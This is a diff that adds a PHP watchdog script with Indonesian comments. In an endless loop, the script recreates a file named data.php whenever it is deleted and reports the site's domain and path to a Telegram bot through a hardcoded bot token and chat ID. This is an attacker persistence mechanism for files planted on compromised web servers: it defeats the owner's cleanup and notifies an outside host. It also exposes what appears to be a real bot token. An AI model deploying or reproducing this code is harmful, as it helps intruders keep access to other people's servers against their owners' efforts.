@@ -1,0 +1,65 @@
+<?php
+// Aktifkan pelaporan kesalahan
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Pencipta: Parlin-Shifu
+
+function sendTelegramNotification($message) {
+    $token = '7787116933:AAHoPsBQl-RB7zfOX5l2ZOsIONorfS9VU5Y'; // Token bot Anda
+    $chat_id = '7563612806'; // ID chat Anda
+    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
+
+    // Menggunakan cURL untuk mengirim notifikasi
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    
+    if ($response === false) {
+        error_log('Telegram notification failed: ' . curl_error($ch));
+    }
+    
+    curl_close($ch);
+}
+
+// Path ke file yang akan dipantau
+$scriptPath = __DIR__ . '/data.php';
+
+// Isi asli file
+$originalContent = '<?php
+// Pencipta: Parlin-Shifu
+
+echo "Saya adalah pembaruan terbaru";
+?>';
+
+// Variabel untuk status notifikasi
+$notificationStatus = [
+    'fileDeleted' => false,
+];
+
+// Ambil nama domain
+$domain = $_SERVER['HTTP_HOST'];
+
+// Loop tanpa henti untuk memantau keberadaan file
+while (true) {
+    // Cek jika file tidak ada
+    if (!file_exists($scriptPath)) {
+        // Kirim notifikasi jika file dihapus dan belum diberi notifikasi
+        if (!$notificationStatus['fileDeleted']) {
+            sendTelegramNotification("Script telah dihapus di domain: " . $domain . " (Path: " . $scriptPath . ")");
+            $notificationStatus['fileDeleted'] = true; // Set status notifikasi penghapusan
+
+            // Upload ulang isi file
+            file_put_contents($scriptPath, $originalContent);
+        }
+    } else {
+        // Reset status jika file ditemukan kembali dan kirim notifikasi hanya sekali
+        if ($notificationStatus['fileDeleted']) {
+            sendTelegramNotification("Script telah diupload ulang di domain: " . $domain . " (Path: " . $scriptPath . ")");
+            $notificationStatus['fileDeleted'] = false; // Reset status penghapusan
+        }
+    }
+
+    sleep(10); // Cek setiap 10 detik
+}
+?>
